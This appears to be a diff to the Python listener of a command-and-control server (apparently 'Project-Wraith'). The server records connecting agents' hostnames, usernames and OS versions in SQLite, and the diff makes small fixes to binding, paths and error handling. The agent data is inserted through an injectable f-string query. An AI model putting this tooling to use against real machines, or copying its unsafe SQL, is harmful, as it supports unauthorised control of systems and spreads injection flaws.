@@ -3,7 +3,7 @@ import socket
 import time
 import random
 import sqlite3
-db = sqlite3.connect('./apps/db.sqlite3', check_same_thread=False)
+db = sqlite3.connect(r'C:\Users\user\Desktop\Wraith\Project-Wraith\WebServer\apps\db.sqlite3', check_same_thread=False)
 # List of active connections
 connections = []
 # Lock thread in case got multiple connections at once
@@ -11,7 +11,7 @@ connections_lock = threading.Lock()
 
 def socket_server():
     global connections 
-    HOST = "0.0.0.0"
+    HOST = "192.168.218.1"
     PORT = 9999
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -29,7 +29,7 @@ def socket_server():
                 else:
                     print(f"[+] {ip} just joined.")
                     identifier = generate_identifier()
-                    information = recv_information(conn,PORT)
+                    information = recv_information(conn)
                     hostname = information['hostname'][-1]
                     username = information['username'][-1]
                     osVersion = information['os_version'][-1]
@@ -40,7 +40,7 @@ def socket_server():
                         identifier = identifier[0]
                         db.execute("UPDATE all_agents SET status='Alive' where ipAddress=?", (ip,))
                     else:
-                        query = f"INSERT into all_agents (identifier, ipAddress, hostname, username, status, lastCheckin, integrity, operatingSystem) VALUES ('{identifier}', '{ip}', '{hostname}', '{username}', 'Alive', '{str(int(time.time()-time.time())) + 'seconds ago'}', 'Low', '{osVersion}')"
+                        query = f"INSERT into all_agents (identifier, ipAddress, hostname, username, status, lastCheckin, integrity, operatingSystem) VALUES ('{identifier}', '{ip}', '{hostname}', '{username}', 'Alive', '{str(int(time.time()-time.time())) + ' seconds ago'}', 'Low', '{osVersion}')"
                         db.execute(query)
                     db.commit()
                     client_info = [ip, conn, time.time(), username, hostname, osVersion, identifier]
@@ -61,7 +61,7 @@ def generate_identifier(length=5):
             if all(conn[6] != identifier for conn in connections) and identifier not in identifier_list:
                 return identifier
  
-def recv_information(conn,PORT):
+def recv_information(conn):
     information = {}
     conn.send(b"\n")
     time.sleep(1)
@@ -109,7 +109,7 @@ def check_connection():
                 conn.send(b"")
                 time.sleep(5)
             #If client disconnect remove from list
-            except(ConnectionResetError):
+            except(ConnectionResetError, OSError):
                 with connections_lock:
                     for client in connections:
                         if conn == client[1]:
